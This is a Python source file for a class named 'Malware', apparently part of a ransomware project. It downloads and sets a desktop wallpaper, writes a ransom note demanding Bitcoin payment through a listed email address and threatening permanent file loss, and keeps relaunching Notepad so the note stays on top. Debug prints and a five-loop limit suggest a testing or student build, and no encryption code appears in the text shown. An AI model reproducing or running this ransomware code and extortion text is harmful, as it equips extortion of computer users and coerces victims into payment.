import os, ctypes, urllib.request, datetime, subprocess, time, win32gui
from .helper_method import *
class Malware:

    def __init__(self):
        self.user_name = os.path.expanduser("~")
        self.ab_path = f"{self.user_name}/Desktop/"

    def change_desktop_wallpaper(self):
        image_url = "https://pm1.narvii.com/7277/cad40d74ff7b2a772ad6340c3d6d28eb2ce2b7d9r1-1080-848v2_hq.jpg"
        passage = f'{self.ab_path}malware.jpg'
        urllib.request.urlretrieve(image_url, passage)
        set_desktop_wallpaper = 20
        ctypes.windll.user32.SystemParametersInfoW(set_desktop_wallpaper, 0, passage, 0)
        animated_marker()

    def you_sure(self):
        answer = input("You sure you want to continue? (y/n)")
        if(answer.lower() == "y"):
            return True

    def ransom_note(self):
        note_path = f'{self.ab_path}/RANSOM_NOTE.txt'
        date = datetime.date.today().strftime('%d-%B-%Y')
        with open(note_path, 'w') as f:
            f.write(f'''
{date}
The harddisks of your computer have been encrypted with an Military grade encryption algorithm.
There is no way to restore your data without a special key.
Only we can decrypt your files!
To purchase your key and restore your data, please follow these three easy steps:
1. Email the file called EMAIL_ME.txt at {self.user_name}/Desktop/EMAIL_ME.txt to cfopstester@gmail.com
2. You will receive your personal BTC address for payment.
   Once payment has been completed, send another email to cfopstester@gmail.com stating "PAID".
   We will check to see if payment has been paid.
3. You will receive a text file with your KEY that will unlock all your files. 
   IMPORTANT: To decrypt your files, place text file on desktop and wait. Shortly after it will begin to decrypt all files.
WARNING:
Do NOT attempt to decrypt your files with any software as it is obsolete and will not work, and may cost you more to unlock your files.
Do NOT change file names, mess with the files, or run deccryption software as it will cost you more to unlock your files-
-and there is a high chance you will lose your files forever.
Do NOT send "PAID" button without paying, price WILL go up for disobedience.
Do NOT think that we wont delete your files altogether and throw away the key if you refuse to pay. WE WILL.
''')

    def show_ransom_note(self):
        note_path = f'{self.ab_path}/RANSOM_NOTE.txt'
        # Open the ransom note
        ransom = subprocess.Popen(['notepad.exe', note_path])
        count = 0 # Debugging/Testing
        while True:
            time.sleep(0.1)
            top_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
            if top_window == 'RANSOM_NOTE - Notepad':
                print('Ransom note is the top window - do nothing') # Debugging/Testing
                pass
            else:
                print('Ransom note is not the top window - kill/create process again') # Debugging/Testing
                # Kill ransom note so we can open it agian and make sure ransom note is in ForeGround (top of all windows)
                time.sleep(0.1)
                ransom.kill()
                # Open the ransom note
                time.sleep(0.1)
                ransom = subprocess.Popen(['notepad.exe', note_path])
            # sleep for 10 seconds
            time.sleep(10)
            count +=1 
            if count == 5:
                break